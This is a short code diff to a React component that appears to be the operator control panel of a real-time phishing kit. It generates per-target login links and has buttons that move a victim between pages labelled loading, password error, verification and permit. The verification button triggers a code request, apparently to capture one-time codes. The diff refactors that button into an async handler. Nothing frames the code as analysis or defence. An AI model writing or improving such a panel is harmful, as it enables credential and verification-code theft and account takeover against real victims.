@@ -54,7 +54,7 @@ export function TargetControl() {
 
   const link = `${BASE_URL}/login/${targetId}`;
 
-  let resp: any = null;
+   let resp: any = null;
 
   return (
     <div>
@@ -98,11 +98,11 @@ export function TargetControl() {
         <hr style={{ margin: "1rem 0" }} />
         <button onClick={() => updateTarget(targetId, { page: 1 })}>Loading</button>
         <button onClick={() => updateTarget(targetId, { page: 2 })}>Erro de Senha</button>
-        <button onClick={() => (
-          updateTarget(targetId, { page: 3 }),
-          resp = newCodeRequest(targetId, ""),
-          console.log('Clicou no botão de verificação, newCodeReqyest: ', resp)
-        )}>Verificação</button>
+        <button onClick={async () => {
+          updateTarget(targetId, { page: 3 });
+          await newCodeRequest(targetId, "");
+          console.log("Clicou no botão de verificação");
+        }}>Verificação</button>
         <button onClick={() => updateTarget(targetId, { page: 4 })}>Permitir</button>
         <button onClick={() => updateTarget(targetId, { page: 5 })}>Requisitar</button>
       </div>
